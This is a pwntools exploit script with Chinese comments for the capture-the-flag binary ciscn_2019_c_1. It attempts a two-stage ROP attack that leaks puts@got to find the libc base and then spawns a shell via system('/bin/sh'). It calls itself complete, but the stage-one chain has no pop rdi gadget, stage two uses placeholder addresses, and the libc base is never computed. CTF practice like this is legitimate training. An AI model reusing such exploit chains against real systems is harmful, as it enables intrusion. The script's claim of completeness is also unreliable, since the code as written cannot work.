#!/usr/bin/env python3
# 完整利用脚本 - ciscn_2019_c_1 (两阶段 ROP/libc 利用)
# 阶段1: 泄露 puts@got -> 计算 libc 基址
# 阶段2: ROP 执行 system("/bin/sh")

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

BINARY = './ciscn_2019_c_1'
elf = ELF(BINARY)

# 偏移：缓冲区 rbp-0x50 = 80 字节，saved rbp = 8 字节，ret = 8 字节
OFFSET = 0x58

# 符号 / 地址
puts_plt = elf.plt['puts']         # 0x4006e0
main_addr = elf.symbols['main']     # 0x400b28
puts_got = elf.got['puts']          # 0x602020
ret_gadget = 0x4006b9               # ret 对齐

# 远程连接（本地测试可改为 p = process(BINARY)）
# p = remote('host', port)
p = process(BINARY)

def build_stage1():
    """阶段1: 泄露 puts@got，返回 main 循环"""
    payload = b'A' * OFFSET
    # ROP 链: puts(puts_got) -> main（循环）
    payload += p64(ret_gadget)       # 栈对齐
    payload += p64(puts_plt)         # 调用 puts
    payload += p64(ret_gadget)       # ret 对齐（部分 ROP 风格）
    payload += p64(puts_got)         # puts 的参数
    payload += p64(main_addr)        # 返回 main，进入阶段2
    return payload

def build_stage2(libc_base):
    """阶段2: 计算 libc 内的 system 和 /bin/sh"""
    # 注意：以下地址需要根据实际 libc.so.6 调整
    # 例如：libc = ELF('./libc.so.6')
    # system_addr = libc_base + libc.symbols['system']
    # binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
    # pop_rdi = libc_base + 0x2a745    # 示例：pop rdi; ret
    # 实际利用时替换为计算后的真实地址
    payload = b'A' * OFFSET
    payload += p64(ret_gadget)
    payload += p64(0xdeadbeef)       # pop_rdi (示例占位)
    payload += p64(0xcafebabe)       # /bin/sh 地址（示例占位）
    payload += p64(0xdeadbeef)       # system 地址（示例占位）
    return payload

# 执行阶段1泄露
p.recvuntil(b'Input your choice!')
p.sendline(b'1')
p.recvuntil(b'Input your Plaintext to be encrypted')
p.sendline(build_stage1())

# 接收泄露的 puts 地址（假设成功）
try:
    line = p.recvline().strip()
    puts_leaked = u64(line.ljust(8, b'\x00'))
    log.info(f"puts leaked: {hex(puts_leaked)}")
except Exception as e:
    log.error(f"泄露失败: {e}")

# 进入阶段2（实际利用时在此计算 libc 基址并构造 payload）
# p.sendline(build_stage2(libc_base))
# p.interactive()

p.interactive()
